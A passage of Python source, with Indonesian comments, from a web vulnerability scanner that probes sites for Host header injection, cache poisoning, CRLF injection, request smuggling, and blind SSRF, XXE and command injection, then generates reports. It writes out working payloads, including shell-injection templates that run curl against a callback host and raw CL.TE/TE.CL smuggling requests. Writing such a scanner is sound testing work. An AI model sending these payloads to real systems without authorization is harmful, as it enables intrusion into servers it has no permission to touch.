    """Nama parameter hasil panen spesifikasi API untuk modul injection (kalau ada)."""
    return [str(name) for name in ((ctx or {}).get("api_params") or []) if name]

def scan_params(sess, base_url, ctx=None):
    """Parameter discovery: cari parameter tak terlihat yang mengubah respons.

    Daftar kata (`PARAM_WORDLIST`) dikirim satu per satu ke URL yang sudah dikenal;
    respons dibandingkan dengan baseline URL tersebut (status + ukuran). Temuan ini
    informasional — hanya penunjuk arah untuk uji manual lanjutan.
    """
    f = FindingList(base_url); info("Mencari parameter tersembunyi...")
    crawler = (ctx or {}).get("crawler")
    urls = list(crawler.pages)[:PARAM_MAX_URLS] if crawler and crawler.pages else []
    if base_url not in urls:
        urls.insert(0, base_url)
    urls = urls[:PARAM_MAX_URLS]
    if _is_spa_catchall(get_base_response(sess, base_url, ctx), ctx):
        info("  (dilewati: SPA catch-all — semua URL mengembalikan halaman yang sama)")
        return f
    info(f"  {len(urls)} URL x {len(PARAM_WORDLIST)} nama parameter diuji")

    # Baseline diambil berurutan (1 request per URL) supaya probe parameter bisa
    # dipetakan paralel sebagai satu daftar job rata: memanggil pmap di dalam pmap
    # akan mengunci thread worker (yang menunggu) sampai executor kehabisan worker.
    baselines = {}
    for url in urls:
        try:
            baseline = sess.get(url, timeout=10)
        except Exception:
            continue
        if baseline.status_code == 200:
            baselines[url] = (baseline.status_code, len(baseline.content))
    jobs = [(url, name) for url in baselines for name in PARAM_WORDLIST]
    if not jobs:
        return f

    def _check(job):
        url, name = job
        status, size = baselines[url]
        try:
            resp = sess.get(url, params={name: "spade1"}, timeout=10)
        except Exception:
            return None
        if resp.status_code != status and resp.status_code in (200, 500):
            return url, name, f"status {status} -> {resp.status_code}"
        delta = len(resp.content) - size
        if abs(delta) > 32:
            return url, name, f"ukuran respons berubah {size} -> {len(resp.content)} byte"
        return None

    seen = set()
    for result in pmap(_check, jobs):
        if not result:
            continue
        url, name, why = result
        if (url, name) in seen:
            continue
        seen.add((url, name))
        info(f"  Parameter tersembunyi: '{name}' ({why})")
        f.append(("INFO", "PARAM_DISCOVERY",
                  f"Parameter '{name}' tidak ada di HTML/form tapi mengubah respons {url} ({why}). "
                  f"Parameter tersembunyi sering membuka fitur debug, filter data, atau alur yang tidak "
                  f"didokumentasikan — layak diuji manual.",
                  url, None), evidence_url=url)
    return f
def _cache_marker(resp):
    """True kalau respons tampak melewati cache (header cache atau Cache-Control publik)."""
    if resp is None:
        return False
    for name in CACHE_MARKER_HEADERS:
        if resp.headers.get(name):
            return True
    control = (resp.headers.get("Cache-Control") or "").lower()
    return "public" in control or "max-age" in control

def scan_host_header(sess, base_url, ctx=None):
    """Uji Host header injection, cache poisoning, dan web cache deception."""
    f = FindingList(base_url); info("Menguji Host header & cache...")
    canary = f"spade-{secrets.token_hex(4)}.invalid"
    targets = []
    crawler = (ctx or {}).get("crawler")
    if crawler and crawler.pages:
        targets.extend(list(crawler.pages)[:4])
    if base_url not in targets:
        targets.insert(0, base_url)
    targets = targets[:5]

    def _host_probe(job):
        url, name = job
        value = f"host={canary}" if name == "Forwarded" else canary
        try:
            resp = sess.get(url, headers={name: value}, timeout=10)
        except Exception:
            return []
        location = resp.headers.get("Location") or ""
        cookie = resp.headers.get("Set-Cookie") or ""
        body = resp.text or ""
        out = []
        if canary in location or canary in cookie:
            out.append(("MEDIUM", "HOST_HEADER_INJECTION",
                        f"Header '{name}' dipakai apa adanya di header respons (Location/Set-Cookie) untuk {url}. "
                        f"Penyerang bisa mengarahkan korban ke domainnya sendiri (web cache poisoning, reset "
                        f"password poisoning, atau pencurian token).",
                        url, f"Host header injection ({name}) di {url}", "firm"))
        elif canary in body:
            out.append(("MEDIUM", "HOST_HEADER_INJECTION",
                        f"Nilai header '{name}' dipantulkan mentah ke body respons {url}. Perlu dikonfirmasi "
                        f"manual apakah nilai ini dipakai di tautan/redirect, karena itu jalan menuju cache "
                        f"poisoning.",
                        url, f"Host header dipantulkan di body ({name}) di {url}", "tentative"))
        if canary in body and _cache_marker(resp):
            out.append(("MEDIUM", "CACHE_POISONING",
                        f"Respons {url} lewat cache (ada marker cache/Cache-Control publik) dan nilai header "
                        f"'{name}' yang dipalsukan ikut tersimpan di body. Cache bisa meracuni pengguna lain "
                        f"dengan konten berisi domain penyerang.",
                        url, f"Indikasi cache poisoning via {name} di {url}", "tentative"))
        return out

    jobs = [(url, name) for url in targets for name in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "Forwarded")]
    seen = set()
    for out in pmap(_host_probe, jobs):
        for sev, code, desc, url, message, confidence in out:
            if (code, url) in seen:
                continue
            seen.add((code, url))
            warn(message)
            f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)

    # ── Cache deception: halaman privat diakses anonim lewat akhiran aset statis ──
    anon = (ctx or {}).get("anon_sess")
    if _ctx_flag(ctx, "auth_enabled") and anon is not None:
        decoy = "/spade-nonexistent.css"
        deception_targets = [join(base_url, path) for path in AUTH_BYPASS_PATHS]
        if crawler and crawler.pages:
            deception_targets.extend(list(crawler.pages)[:3])

        def _deception(url):
            try:
                authed = sess.get(url, timeout=10)
                denied = anon.get(url, timeout=10)
            except Exception:
                return []
            if authed.status_code != 200 or denied.status_code not in (401, 403):
                return []
            fake = url.rstrip("/") + decoy
            try:
                cached = anon.get(fake, timeout=10)
            except Exception:
                return []
            if cached.status_code != 200:
                return []
            if _resp_fingerprint(cached) != _resp_fingerprint(authed):
                return []
            confidence = "firm" if _cache_marker(cached) else "tentative"
            return [("MEDIUM", "CACHE_DECEPTION",
                     f"Halaman privat {url} hanya bisa dibuka sesi terautentikasi, tapi versi berakhiran aset "
                     f"statis ({fake}) melayani isi yang sama ke pengunjung anonim. Cache/CDN menyimpan respons "
                     f"itu, sehingga data privat bisa terbaca siapa pun.",
                     fake, f"Cache deception: {fake} membocorkan halaman privat", confidence)]

        for out in pmap(_deception, deception_targets):
            for sev, code, desc, url, message, confidence in out:
                warn(message)
                f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
    return f

CRLF_TARGET_PATHS = ("/redirect", "/login", "/logout", "/api/redirect")
CRLF_PARAMS = ("next", "url", "redirect", "return", "to", "dest", "goto", "target",
               "continue", "callback", "path", "file", "page", "ref", "u")
CRLF_MAX_JOBS = 120

def _raw_query_url(url, param, payload):
    """URL dengan payload mentah di query (tanpa encode ulang).

    Payload CRLF memakai escape `%0d%0a` yang harus sampai apa adanya; kalau
    dikirim lewat `params=` maka `%` ikut di-encode jadi `%250d` dan uji gagal.
    """
    head = url.split("#", 1)[0]
    separator = "&" if urllib.parse.urlparse(head).query else "?"
    return f"{head}{separator}{param}={payload}"

def scan_crlf(sess, base_url, ctx=None):
    """Uji CRLF injection / response splitting lewat parameter yang masuk ke header."""
    f = FindingList(base_url); info("Menguji CRLF injection...")
    paths = [join(base_url, path) for path in CRLF_TARGET_PATHS]
    crawler = (ctx or {}).get("crawler")
    if crawler and crawler.pages:
        paths.extend(list(crawler.pages)[:2])
    jobs = [(url, param, payload, label)
            for url in paths
            for param in CRLF_PARAMS[:CRLF_MAX_PARAMS]
            for payload, label in CRLF_PAYLOADS][:CRLF_MAX_JOBS]
    if not jobs:
        return f
    info(f"  {len(jobs)} kombinasi path/parameter/payload diuji")

    def _check(job):
        url, param, payload, label = job
        try:
            resp = sess.get(_raw_query_url(url, param, payload), timeout=10, allow_redirects=False)
        except Exception:
            return []
        headers = {name.lower(): str(value) for name, value in resp.headers.items()}
        if "x-spade-injected" in headers or "spade=1" in headers.get("set-cookie", ""):
            return [("MEDIUM", "CRLF_INJECTION",
                     f"Parameter '{param}' di {url} menyisipkan header respons baru lewat urutan CRLF "
                     f"({label}). Penyerang bisa memecah respons (response splitting), menulis cookie palsu, "
                     f"atau melakukan cache poisoning lewat XSS di header.",
                     resp.url, f"CRLF injection terkonfirmasi di '{param}' ({label})", "firm")]
        if "spade-injected" in (resp.text or "").lower():
            return [("MEDIUM", "CRLF_INJECTION",
                     f"Karakter CRLF dari parameter '{param}' di {url} muncul di body respons ({label}). "
                     f"Perlu dikonfirmasi manual apakah urutan CRLF benar-benar memecah header respons di "
                     f"reverse proxy/cache di depannya.",
                     resp.url, f"Indikasi CRLF injection di '{param}' ({label})", "tentative")]
        return []

    # `pmap_until` mengembalikan hasil pertama yang truthy (yaitu list temuan dari
    # `_check`), bukan daftar hasil — jadi tiap elemennya adalah satu temuan.
    for sev, code, desc, url, message, confidence in pmap_until(_check, jobs) or []:
        critical(message)
        f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
    return f

def _smuggling_payloads(host, canary):
    """Payload CL.TE dan TE.CL dengan path canary untuk membuktikan desync.

    curl selalu menormalkan Content-Length/Transfer-Encoding, jadi payload ini
    hanya bisa dikirim lewat socket mentah (`raw_http_probe`).
    """
    smuggled = (f"GET /{canary} HTTP/1.1\r\nHost: {host}\r\n"
                f"X-Spade-Smuggled: 1\r\n\r\n")
    cl_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
             f"Content-Length: {len(smuggled) + 5}\r\n"
             f"Transfer-Encoding: chunked\r\n\r\n"
             f"0\r\n\r\n" + smuggled)
    te_cl = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
             f"Content-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\n\r\n"
             f"1\r\nZ\r\n0\r\n\r\n" + smuggled)
    return [("CL.TE", cl_te), ("TE.CL", te_cl)]

def scan_smuggling(sess, base_url, ctx=None):
    """Deteksi request smuggling CL.TE / TE.CL lewat koneksi socket mentah.

    Uji ini merusak stream koneksi, jadi hanya jalan dengan `--check-smuggling`.
    Tanpa flag, modul tetap muncul di daftar modul mode detailed tapi langsung
    mengembalikan daftar kosong tanpa mengirim paket apa pun. Laporan hanya dibuat
    kalau canary path benar-benar diproses sebagai request terpisah oleh server.
    """
    f = FindingList(base_url, capture=False)
    if not _ctx_flag(ctx, "check_smuggling"):
        return f
    info("Menguji request smuggling (raw socket, CL.TE/TE.CL)...")
    parsed = urllib.parse.urlparse(base_url)
    # `netloc` (host:port) hanya untuk header Host; koneksi socket butuh hostname polos.
    connect_host = parsed.hostname or parsed.netloc
    netloc = parsed.netloc
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"
    canary = "spade-smuggle-" + secrets.token_hex(4)

    def _probe(job):
        label, payload = job
        raw = raw_http_probe(connect_host, port, payload, use_tls=use_tls, timeout=8.0)
        if not raw:
            return []
        text = raw.decode("utf-8", "replace")
        if canary not in text:
            return []
        return [("HIGH", "REQUEST_SMUGGLING",
                 f"Server memproses request smuggling {label}: path canary yang dikirim sebagai bagian body ikut "
                 f"dijalankan sebagai request terpisah (terlihat di respons mentah). Penyerang bisa membajak "
                 f"request pengguna lain, melewati kontrol keamanan front-end, atau melakukan cache poisoning.",
                 base_url, f"Request smuggling {label} terkonfirmasi", "firm")]

    for out in pmap(_probe, _smuggling_payloads(netloc, canary)):
        for sev, code, desc, url, message, confidence in out:
            critical(message)
            f.append((sev, code, desc, url), evidence_url=None, confidence=confidence)
    return f

# ── Out-of-band (OOB) — verifikasi blind SSRF/XXE/CMDi lewat collector sendiri ──

XXE_OOB_TEMPLATE = ('<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE spade [<!ENTITY % spade SYSTEM "{callback}"> %spade;]>'
                    '<spade>spade</spade>')
CMDI_OOB_TEMPLATES = ("; curl {callback}", "| curl {callback}", "$(curl {callback})", "& curl {callback}")

def _oob_enabled(ctx):
    """Modul OOB hanya jalan kalau tester menyediakan --oob-host (collector sendiri)."""
    return bool((ctx or {}).get("oob_host"))

def _oob_collect(sess, ctx, probes):
    """Tunggu sekali, lalu tanya collector untuk setiap token.

    `probes` = daftar (token, url, label). Mengembalikan daftar (url, label, pesan)
    hanya untuk token yang benar-benar menerima callback.
    """
    if not probes:
        return []
    time.sleep(OOB_CHECK_DELAY)
    checker = (ctx or {}).get("anon_sess") or sess
    host = (ctx or {}).get("oob_host")
    hits = []
    for token, url, label in probes:
        ok, message = oob_check(checker, host, token)
        if ok:
            hits.append((url, label, message))
    return hits

def scan_oob_ssrf(sess, base_url, ctx=None):
    """Blind SSRF yang dikonfirmasi lewat callback ke collector OOB (butuh --oob-host)."""
    f = FindingList(base_url)
    if not _oob_enabled(ctx):
        return f
    info("Menguji blind SSRF via callback OOB...")

    def _probe(job):
        path, param = job
        token = oob_token()
        try:
            resp = sess.get(join(base_url, path), params={param: oob_callback_url(ctx["oob_host"], token)}, timeout=10)
        except Exception:
            return None
        return token, resp.url, f"GET {path}?{param}=<callback>"

    jobs = [(path, param) for path in OOB_SSRF_PATHS for param in ("url", "uri", "target")]
    probes = [probe for probe in pmap(_probe, jobs) if probe]
    hits = _oob_collect(sess, ctx, probes)
    if not hits:
        info("  Tidak ada callback SSRF diterima")
    for url, label, message in hits:
        warn(f"Blind SSRF terkonfirmasi: {label}")
        f.append(("MEDIUM", "SSRF_BLIND",
                  f"Target memproses URL yang dikirim penyerang dan menghubungi alamat di luar ({label}). "
                  f"Callback diterima collector: {message}. Server bisa dipakai memindai jaringan internal, "
                  f"membaca metadata cloud, atau menjangkau layanan internal.",
                  url), evidence_url=url, confidence="firm")
    return f

def scan_oob_xxe(sess, base_url, ctx=None):
    """Blind XXE yang dikonfirmasi lewat callback OOB (butuh --oob-host)."""
    f = FindingList(base_url)
    if not _oob_enabled(ctx):
        return f
    info("Menguji blind XXE via callback OOB...")

    def _probe(path):
        token = oob_token()
        payload = XXE_OOB_TEMPLATE.format(callback=oob_callback_url(ctx["oob_host"], token))
        url = join(base_url, path)
        try:
            sess.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
        except Exception:
            return None
        return token, url, f"POST {path} (XML external entity)"

    probes = [probe for probe in pmap(_probe, list(OOB_XXE_PATHS)) if probe]
    hits = _oob_collect(sess, ctx, probes)
    if not hits:
        info("  Tidak ada callback XXE diterima")
    for url, label, message in hits:
        warn(f"Blind XXE terkonfirmasi: {label}")
        f.append(("HIGH", "XXE_BLIND",
                  f"Parser XML di {url} memproses external entity dan menghubungi alamat penyerang ({label}). "
                  f"Callback diterima collector: {message}. Dari sini data file server bisa dibaca atau "
                  f"dilanjutkan jadi SSRF ke jaringan internal.",
                  url), evidence_url=url, confidence="firm")
    return f

def scan_oob_cmdi(sess, base_url, ctx=None):
    """Blind command injection yang dikonfirmasi lewat callback OOB (butuh --oob-host)."""
    f = FindingList(base_url)
    if not _oob_enabled(ctx):
        return f
    info("Menguji blind command injection via callback OOB...")

    def _probe(job):
        path, param, template = job
        token = oob_token()
        payload = template.format(callback=oob_callback_url(ctx["oob_host"], token))
        try:
            resp = sess.get(join(base_url, path), params={param: payload}, timeout=10)
        except Exception:
            return None
        return token, resp.url, f"GET {path}?{param}=<command>"

    jobs = [(path, param, template)
            for path in OOB_CMDI_PATHS
            for param in ("cmd", "host", "target", "exec")
            for template in CMDI_OOB_TEMPLATES]
    probes = [probe for probe in pmap(_probe, jobs) if probe]
    hits = _oob_collect(sess, ctx, probes)
    if not hits:
        info("  Tidak ada callback CMDi diterima")
    seen = set()
    for url, label, message in hits:
        # Beberapa template (`;`, `|`, `$(...)`) sering mengenai titik injeksi yang
        # sama; cukup satu temuan per titik supaya laporan tidak berulang.
        point = url.split("?", 1)[0]
        if point in seen:
            continue
        seen.add(point)
        critical(f"Blind command injection terkonfirmasi: {label}")
        f.append(("CRITICAL", "CMDI_BLIND",
                  f"Parameter di {url} diteruskan ke shell: server menjalankan perintah yang mengarah ke "
                  f"collector penyerang ({label}). Callback diterima collector: {message}. Penyerang bisa "
                  f"menjalankan perintah apa pun dengan hak akses web server.",
                  url), evidence_url=url, confidence="firm")
    return f

# ── report ──
SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}

def _normalize_findings(finds):
    return [as_finding(f) for f in finds]

def _finding_meta(finding):
    """Metadata temuan: pakai milik Finding kalau ada, kalau tidak lihat kode."""
    meta = getattr(finding, "meta", None)
    return meta if meta is not None else finding_meta(finding[1])

def _finding_confidence(finding):
    declared = getattr(finding, "confidence", None)
    return declared or finding_confidence(finding[1])

def _truncate(text, limit=EVIDENCE_SNIPPET_CHARS):
    text = text or ""
    return text if len(text) <= limit else text[:limit] + "… (dipotong)"

def confidence_badge(finding):
    """Baris kecil berisi confidence + CVSS/CWE/OWASP untuk satu temuan."""
    meta = _finding_meta(finding)
    bits = [f"confidence: {_finding_confidence(finding)}"]
    if meta and meta.vector:
        bits.append(f"CVSS {meta.score} ({meta.vector})")
    if meta and meta.cwe:
        bits.append(meta.cwe)
    if meta and meta.owasp:
        bits.append(meta.owasp)
    return " · ".join(bits)

def evidence_html(finding, impersonate=None):
    """Blok `<details>` berisi bukti request/response + langkah reproduksi."""
    exchange = getattr(finding, "evidence", None)
    meta_line = htmlmod.escape(confidence_badge(finding))
    if exchange is None:
        return (f'<details><summary>Bukti &amp; repro</summary><div class="meta">{meta_line}</div>'
                '<p class="note">Tidak ada bukti HTTP untuk temuan ini '
                '(diperoleh dari pemeriksaan non-HTTP, mis. handshake TLS/socket).</p></details>')
    head = [
        f'<div class="meta">{meta_line}</div>',
        f'<p class="note">{htmlmod.escape(exchange.method)} {htmlmod.escape(redact_url(exchange.url))} '
        f'&rarr; HTTP {htmlmod.escape(str(exchange.status))} '
        f'({exchange.response_length} byte, {exchange.elapsed_ms} ms, {htmlmod.escape(exchange.timestamp)})</p>',
    ]
    header_lines = "\n".join(f"{k}: {v}" for k, v in exchange.request_headers.items())
    if header_lines:
        head.append("<h4>Request headers (redaksi)</h4>")
        head.append(f"<pre>{htmlmod.escape(header_lines)}</pre>")
    if exchange.request_body:
        head.append("<h4>Request body</h4>")
        head.append(f"<pre>{htmlmod.escape(_truncate(exchange.request_body))}</pre>")
    if exchange.response_snippet:
        head.append("<h4>Potongan respons</h4>")
        head.append(f"<pre>{htmlmod.escape(_truncate(exchange.response_snippet))}</pre>")
    repro = repro_curl(exchange, impersonate or DEFAULT_IMPERSONATE)
    if repro["curl"]:
        head.append("<h4>Reproduksi (curl)</h4>")
        head.append(f"<pre>{htmlmod.escape(repro['curl'])}</pre>")
        head.append("<h4>Reproduksi (curl_cffi)</h4>")
        head.append(f"<pre>{htmlmod.escape(repro['python_curl_cffi'])}</pre>")
        head.append('<p class="note">Scan ini memakai impersonasi browser '
                    f"({htmlmod.escape(str(impersonate or DEFAULT_IMPERSONATE))}), jadi header dan TLS "
                    "fingerprint-nya ikut disamarkan. `curl` polos bisa memberi hasil berbeda — "
                    "pakai snippet curl_cffi di atas untuk mereplikasi kondisi scan.</p>")
    return f'<details><summary>Bukti &amp; repro</summary>{"".join(head)}</details>'

def evidence_status(finding):
    """Status bukti untuk CSV: `http` kalau ada exchange, `none` kalau tidak."""
    return "http" if getattr(finding, "evidence", None) is not None else "none"

def evidence_url(finding):
    exchange = getattr(finding, "evidence", None)
    return redact_url(exchange.url) if exchange is not None else ""

def scan_summary(finds):
    """Ringkasan jumlah temuan per severity dan per confidence."""
    by_severity = defaultdict(int)
    by_confidence = defaultdict(int)
    for finding in finds:
        by_severity[finding[0]] += 1
        by_confidence[_finding_confidence(finding)] += 1
    return {
        "total": len(finds),
        "by_severity": {s: by_severity[s] for s in sorted(by_severity, key=lambda x: SEV_ORDER.get(x, 99))},
        "by_confidence": dict(sorted(by_confidence.items())),
    }

def gen_html(finds, target, start, end, out, impersonate=None):
    """Laporan HTML. `impersonate` dipakai untuk menuliskan konteks PoC reproduksi."""
    finds = _normalize_findings(finds)
    def sk(f): return (SEV_ORDER.get(f[0],99), f[2] if len(f)>2 else "")
    sf = sorted(finds, key=sk)
    rows = ""
    for fi in sf:
        sev = fi[0].lower()
        url_cell = ""
        if fi[3]:
            url_cell = f'<td style="word-break:break-all"><a href="{htmlmod.escape(fi[3])}" target="_blank" rel="noopener" style="color:#58a6ff">{htmlmod.escape(fi[3])}</a></td>'
        rows += (f'<tr class="{sev}"><td><span class="sev-badge {sev}">{htmlmod.escape(str(fi[0]))}</span></td>'
                 f'<td>{htmlmod.escape(str(fi[1]))}</td><td>{htmlmod.escape(str(fi[2]))}'
                 f'{evidence_html(fi, impersonate)}</td>{url_cell}</tr>\n')
    sc = defaultdict(int)
    for fi in sf: sc[fi[0]]+=1
    summary = "".join(f'<div class="sev-count {s.lower()}"><strong>{s}:</strong> {c}</div>' for s,c in sorted(sc.items(), key=lambda x: SEV_ORDER.get(x[0],99)))
    with_evidence = sum(1 for fi in sf if getattr(fi, "evidence", None) is not None)
    evidence_card = (f'<div class="card"><h3>Bukti</h3><div class="val">{with_evidence}/{len(sf)}</div>'
                     f'<div style="margin-top:8px"><span class="sev-count">confidence: '
                     f'{htmlmod.escape(", ".join(f"{k} {v}" for k, v in sorted(scan_summary(sf)["by_confidence"].items())))}</span></div></div>')
    dur = (end-start).total_seconds()
    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spade Scan - {htmlmod.escape(target)}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}}
h1{{font-size:1.6rem;margin-bottom:4px}}
.subtitle{{color:#8b949e;margin-bottom:24px}}
.summary{{display:flex;gap:20px;flex-wrap:wrap;margin-bottom:24px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;flex:1;min-width:150px}}
.card h3{{font-size:.85rem;color:#8b949e;text-transform:uppercase}}
.card .val{{font-size:1.8rem;font-weight:700;margin-top:4px}}
.sev-count{{display:inline-block;margin-right:12px;margin-bottom:6px;padding:4px 10px;border-radius:12px;font-size:.85rem}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden}}
th{{background:#21262d;padding:10px 14px;text-align:left;font-size:.8rem;text-transform:uppercase;color:#8b949e}}
td{{padding:10px 14px;border-top:1px solid #21262d;font-size:.9rem}}
.sev-badge{{display:inline-block;padding:2px 8px;border-radius:10px;font-weight:600;font-size:.75rem}}
.critical .sev-badge{{background:#d73a4a;color:#fff}}
tr.high{{border-left:3px solid #d73a4a}}
.high .sev-badge{{background:#d73a4a;color:#fff}}
tr.medium{{border-left:3px solid #d29922}}
.medium .sev-badge{{background:#d29922;color:#0d1117}}
tr.low{{border-left:3px solid #58a6ff}}
.low .sev-badge{{background:#58a6ff;color:#0d1117}}
tr.info{{border-left:3px solid #8b949e}}
.info .sev-badge{{background:#8b949e;color:#0d1117}}
details{{margin-top:8px}}
summary{{cursor:pointer;color:#58a6ff;font-size:.8rem}}
details h4{{font-size:.75rem;color:#8b949e;text-transform:uppercase;margin:10px 0 4px}}
pre{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px;overflow-x:auto;
     font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.78rem;white-space:pre-wrap;word-break:break-all}}
.meta{{font-size:.78rem;color:#8b949e;margin-top:6px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}}
.note{{font-size:.78rem;color:#8b949e;margin-top:6px}}
.footer{{margin-top:32px;text-align:center;color:#484f58;font-size:.8rem}}
</style></head><body><div class="container">
<h1>Spade Scan Report</h1>
<p class="subtitle">{htmlmod.escape(target)} &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</p>
<div class="summary"><div class="card"><h3>Duration</h3><div class="val">{dur:.1f}s</div></div><div class="card"><h3>Findings</h3><div class="val">{len(sf)}</div></div><div class="card"><h3>Severity</h3><div style="margin-top:8px">{summary}</div></div>{evidence_card}</div>
<table><thead><tr><th style="width:90px">Severity</th><th style="width:200px">Category</th><th>Detail</th><th style="width:300px">URL</th></tr></thead><tbody>{rows}</tbody></table>
<div class="footer">spade &mdash; {end.strftime('%Y-%m-%d %H:%M:%S')}</div>
</div></body></html>"""
    with open(out,"w",encoding="utf-8") as f: f.write(html)
    return out

def gen_csv(finds, target, out):
    """CSV temuan. Lima kolom lama tetap di posisi semula; kolom bukti/metadata menyusul di belakang."""
    finds = _normalize_findings(finds)
    with open(out,"w",newline="",encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Severity","Category","Detail","URL","Target","Confidence","CVSS_Score","CVSS_Vector",
                    "CWE","OWASP","Repro_Curl","Evidence_Status","Evidence_URL"])
        for fi in finds:
            meta = _finding_meta(fi)
            repro = repro_curl(getattr(fi, "evidence", None))
            w.writerow([fi[0], fi[1], fi[2], fi[3] or "", target,
                        _finding_confidence(fi),
                        "" if meta is None or meta.vector is None else meta.score,
                        (meta.vector if meta else "") or "",
                        (meta.cwe if meta else "") or "",
                        (meta.owasp if meta else "") or "",
                        repro["curl"],
                        evidence_status(fi),
                        evidence_url(fi)])

SarifLevels = {"CRITICAL": "error", "HIGH": "error", "MEDIUM": "warning", "LOW": "note", "INFO": "note"}

def _cvss_score(meta):
    """Skor CVSS, atau None kalau temuan tidak punya vector (informasional)."""
    payload = cvss_of(meta)
    return payload["score"] if payload else None

def _cvss_help_uri(meta):
    if meta and meta.cwe:
        number = meta.cwe.split("-")[-1]
        return f"https://cwe.mitre.org/data/definitions/{number}.html"
    return "https://owasp.org/Top10/"

def gen_json(finds, target, out, scan=None):
    """Laporan JSON mesin-baca: metadata scan + ringkasan + temuan lengkap dengan bukti."""
    scan = scan or {}
    finds = _normalize_findings(finds)
    impersonate = scan.get("impersonate")
    payload = {
        "tool": {"name": "spade", "version": SPADE_VERSION},
        "target": target,
        "scan": {
            "mode": scan.get("mode"),
            "started_at": scan.get("started_at"),
            "finished_at": scan.get("finished_at"),
            "duration_s": scan.get("duration_s"),
            "impersonate": impersonate,
            "workers": scan.get("workers"),
            "modules": scan.get("modules", []),
            "errors": scan.get("errors", []),
            "redacted": REDACT_ENABLED,
            # Status flag aktif: penting untuk audit karena mengubah cakupan uji
            # (uji autentikasi, uji tulis, dan callback OOB tidak pernah default).
            "auth": bool(scan.get("auth")),
            "active_writes": bool(scan.get("active_writes")),
            "check_smuggling": bool(scan.get("check_smuggling")),
            "oob": bool(scan.get("oob")),
        },
        "summary": scan_summary(finds),
        "findings": [f.to_dict(EVIDENCE_SNIPPET_CHARS_JSON, None, impersonate) for f in finds],
    }
    with open(out, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    return out

def gen_sarif(finds, target, out, scan=None):
    """Laporan SARIF 2.1.0 supaya temuan bisa diunggah ke GitHub code scanning/dashboard SARIF."""
    scan = scan or {}
    finds = _normalize_findings(finds)
    rules = []
    rule_index = {}
    for finding in finds:
        if finding.code in rule_index:
            continue
        meta = _finding_meta(finding)
        rule_index[finding.code] = len(rules)
        rules.append({
            "id": finding.code,
            "name": finding.code,
            "shortDescription": {"text": finding.code},
            "fullDescription": {"text": finding.desc},
            "defaultConfiguration": {"level": SarifLevels.get(finding[0], "note")},
            "helpUri": _cvss_help_uri(meta),
            "properties": {
                "severity": finding[0],
                "confidence": _finding_confidence(finding),
                "cvssScore": _cvss_score(meta),
                "cvssVector": meta.vector if meta else None,
                "cwe": meta.cwe if meta else None,
                "owasp": meta.owasp if meta else None,
                "tags": ["security", "web"],
            },
        })
    results = []
    for finding in finds:
        meta = _finding_meta(finding)
        results.append({
            "ruleId": finding.code,
            "ruleIndex": rule_index[finding.code],
            "level": SarifLevels.get(finding[0], "note"),
            "message": {"text": f"{finding.code}: {finding[2]}" + (f" ({finding[3]})" if finding[3] else "")},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {"uri": redact_url(finding[3] or target)},
                    "region": {"startLine": 1},
                },
            }],
            "partialFingerprints": {"findingId": finding.finding_id},
            "properties": {
                "confidence": _finding_confidence(finding),
                "cvssScore": _cvss_score(meta),
                "cwe": meta.cwe if meta else None,
                "owasp": meta.owasp if meta else None,
                "evidenceUrl": evidence_url(finding),
            },
        })
    document = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {"driver": {"name": "spade", "version": SPADE_VERSION, "informationUri": "https://github.com/RiloArbabillah/spade",
                                "rules": rules}},
            "invocations": [{
                "executionSuccessful": True,
                "startTimeUtc": scan.get("started_at"),
                "endTimeUtc": scan.get("finished_at"),
                "properties": {"target": target, "mode": scan.get("mode")},
            }],
            "results": results,
        }],
    }
    with open(out, "w", encoding="utf-8") as handle:
        json.dump(document, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    return out

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

# Registry modul scan — satu sumber kebenaran untuk mode CLI maupun test.
# Format: key -> (label tampilan, fungsi scan(sess, base_url, ctx))
ALL_MODULES = OrderedDict([
    ("tech",      ("Teknologi", tech_finger)),
    ("idor",      ("IDOR/BOLA", scan_idor)),
    ("csrf",      ("CSRF", scan_csrf)),
    ("authbypass",("Auth Bypass", scan_auth_bypass)),
    ("headers",   ("Security Headers", sec_headers)),
    ("robots",    ("robots.txt", robots_txt)),
    ("sensitive", ("File Sensitif", sensitive_files)),
    ("dirlist",   ("Directory Listing", dir_listing)),
    ("methods",   ("HTTP Methods", http_methods)),
    ("cors",      ("CORS", cors_check)),
    ("tls",       ("TLS/SSL", tls_ssl)),
    ("forms",     ("Analisis Form", scan_forms_analyze)),
    ("sqli",      ("SQL Injection", scan_sqli)),
    ("xss",       ("XSS", scan_xss)),
    ("openr",     ("Open Redirect", open_redirect)),
    ("lfi",       ("LFI", lfi_check)),
    ("cmdi",      ("Command Injection", cmd_injection)),
    ("ssrf",      ("SSRF", ssrf_check)),
